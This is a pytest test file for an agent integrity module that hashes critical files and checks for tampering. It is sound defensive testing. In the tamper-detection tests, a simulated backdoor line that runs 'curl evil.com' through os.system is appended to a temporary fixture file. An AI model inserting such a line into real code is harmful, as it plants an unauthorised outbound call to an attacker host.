# tests/agent/test_agent_integrity.py
"""
Unit Tests for Agent Integrity Module
Tests the hash calculation and verification logic

Run with:
    cd /home/zero-trust-net
    pytest tests/agent/test_agent_integrity.py -v
    pytest tests/agent/test_agent_integrity.py -v -k "test_calculate"
"""

import pytest
import hashlib
import json
from pathlib import Path
from unittest.mock import patch, Mock

import sys
sys.path.insert(0, str(Path(__file__).parent.parent.parent / "agent"))

from collectors.agent_integrity import (
    calculate_file_hash,
    calculate_agent_integrity,
    calculate_combined_hash,
    get_integrity_report,
    verify_against_expected,
    CRITICAL_FILES,
)


class TestCalculateFileHash:
    """Tests for calculate_file_hash function"""

    def test_hash_existing_file(self, temp_agent_dir):
        """Test hashing an existing file"""
        test_file = Path(temp_agent_dir) / "agent.py"

        result = calculate_file_hash(test_file)

        assert result is not None
        assert len(result) == 64  # SHA-256 produces 64 hex chars
        assert all(c in "0123456789abcdef" for c in result)

    def test_hash_nonexistent_file(self, temp_agent_dir):
        """Test hashing a file that doesn't exist"""
        fake_file = Path(temp_agent_dir) / "nonexistent.py"

        result = calculate_file_hash(fake_file)

        assert result is None

    def test_hash_consistency(self, temp_agent_dir):
        """Test that same file always produces same hash"""
        test_file = Path(temp_agent_dir) / "agent.py"

        hash1 = calculate_file_hash(test_file)
        hash2 = calculate_file_hash(test_file)
        hash3 = calculate_file_hash(test_file)

        assert hash1 == hash2 == hash3

    def test_different_files_different_hashes(self, temp_agent_dir):
        """Test that different files produce different hashes"""
        file1 = Path(temp_agent_dir) / "agent.py"
        file2 = Path(temp_agent_dir) / "client.py"

        hash1 = calculate_file_hash(file1)
        hash2 = calculate_file_hash(file2)

        assert hash1 != hash2

    def test_hash_detects_modification(self, temp_agent_dir):
        """Test that modifying file changes hash"""
        test_file = Path(temp_agent_dir) / "agent.py"

        hash_before = calculate_file_hash(test_file)

        # Modify the file
        with open(test_file, "a") as f:
            f.write("\n# MALICIOUS CODE INJECTED\n")

        hash_after = calculate_file_hash(test_file)

        assert hash_before != hash_after


class TestCalculateAgentIntegrity:
    """Tests for calculate_agent_integrity function"""

    def test_returns_dict_of_hashes(self, temp_agent_dir):
        """Test that function returns dictionary of file hashes"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            result = calculate_agent_integrity()

        assert isinstance(result, dict)
        assert len(result) > 0
        for path, hash_val in result.items():
            assert len(hash_val) == 64

    def test_all_critical_files_hashed(self, temp_agent_dir):
        """Test that all critical files are included"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            result = calculate_agent_integrity()

        # Check that expected files are present
        expected_files = [
            "agent.py",
            "client.py",
            "collectors/agent_integrity.py",
        ]
        for expected in expected_files:
            assert expected in result, f"Missing critical file: {expected}"


class TestCalculateCombinedHash:
    """Tests for calculate_combined_hash function"""

    def test_produces_single_hash(self, sample_file_hashes):
        """Test that combined hash is a single 64-char string"""
        result = calculate_combined_hash(sample_file_hashes)

        assert isinstance(result, str)
        assert len(result) == 64

    def test_deterministic_ordering(self, sample_file_hashes):
        """Test that same input always produces same output"""
        result1 = calculate_combined_hash(sample_file_hashes)
        result2 = calculate_combined_hash(sample_file_hashes)

        # Even if dict ordering differs
        reversed_hashes = dict(reversed(list(sample_file_hashes.items())))
        result3 = calculate_combined_hash(reversed_hashes)

        assert result1 == result2 == result3

    def test_different_hashes_different_combined(self, sample_file_hashes):
        """Test that any change in file hash changes combined hash"""
        original = calculate_combined_hash(sample_file_hashes)

        # Modify one file hash
        modified = sample_file_hashes.copy()
        modified["agent.py"] = "x" * 64

        modified_result = calculate_combined_hash(modified)

        assert original != modified_result


class TestGetIntegrityReport:
    """Tests for get_integrity_report function"""

    def test_report_structure(self, temp_agent_dir):
        """Test that report contains all expected fields"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            report = get_integrity_report()

        assert "combined_hash" in report
        assert "file_hashes" in report
        assert "agent_path" in report
        assert "file_count" in report
        assert "missing_files" in report

    def test_combined_hash_matches_files(self, temp_agent_dir):
        """Test that combined_hash matches calculation from file_hashes"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            report = get_integrity_report()

        recalculated = calculate_combined_hash(report["file_hashes"])

        assert report["combined_hash"] == recalculated

    def test_file_count_accurate(self, temp_agent_dir):
        """Test that file_count matches actual files"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            report = get_integrity_report()

        assert report["file_count"] == len(report["file_hashes"])


class TestVerifyAgainstExpected:
    """Tests for verify_against_expected function"""

    def test_matching_hash_returns_true(self, temp_agent_dir):
        """Test that matching hash returns True"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            report = get_integrity_report()
            expected_hash = report["combined_hash"]

            result = verify_against_expected(expected_hash)

        assert result is True

    def test_mismatching_hash_returns_false(self, temp_agent_dir):
        """Test that wrong hash returns False"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            result = verify_against_expected("wrong_hash_" + "0" * 50)

        assert result is False


class TestIntegrityTampering:
    """Tests for tamper detection scenarios"""

    def test_detect_file_addition(self, temp_agent_dir):
        """Test that adding malicious file is detectable"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            original_report = get_integrity_report()
            original_hash = original_report["combined_hash"]

        # Add malicious file (not in CRITICAL_FILES - won't change hash)
        # But if attacker modifies a critical file...
        malicious_file = Path(temp_agent_dir) / "agent.py"
        with open(malicious_file, "a") as f:
            f.write("\n# BACKDOOR\nimport os; os.system('curl evil.com')\n")

        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            new_report = get_integrity_report()
            new_hash = new_report["combined_hash"]

        assert original_hash != new_hash, "Tampered file should change combined hash"

    def test_detect_file_modification(self, temp_agent_dir):
        """Test detection of file content modification"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            original = get_integrity_report()

        # Modify client.py
        client_file = Path(temp_agent_dir) / "client.py"
        client_file.write_text("# REPLACED BY ATTACKER\nprint('owned')\n")

        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            modified = get_integrity_report()

        assert original["combined_hash"] != modified["combined_hash"]
        assert original["file_hashes"]["client.py"] != modified["file_hashes"]["client.py"]

    def test_detect_file_deletion(self, temp_agent_dir):
        """Test detection of file deletion"""
        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            original = get_integrity_report()

        # Delete a file
        (Path(temp_agent_dir) / "client.py").unlink()

        with patch('collectors.agent_integrity.get_agent_base_path', return_value=Path(temp_agent_dir)):
            modified = get_integrity_report()

        assert original["file_count"] > modified["file_count"]
        assert "client.py" not in modified["file_hashes"]


# ============================================
# Run tests directly
# ============================================
if __name__ == "__main__":
    pytest.main([__file__, "-v", "--tb=short"])
